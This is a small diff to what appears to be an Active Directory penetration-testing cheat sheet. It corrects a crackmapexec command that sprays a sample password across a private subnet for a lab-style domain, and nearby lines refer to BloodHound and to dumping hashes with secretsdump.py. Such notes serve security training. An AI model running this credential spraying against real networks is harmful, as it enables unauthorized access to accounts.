@@ -1050,7 +1050,7 @@ Transfer the zip file to kali instance and load it into bloodhound to visualize.
 You can spray credentials in an AD network using crackmapexec:
 
 ```
-crackmapexec 192.168.92.0/24 -u ealderson -d WHITEROSE.local -p Password123
+crackmapexec smb 192.168.92.0/24 -u ealderson -d WHITEROSE.local -p Password123
 ```
 
 ## Dumping Hashes With secretsdump.py
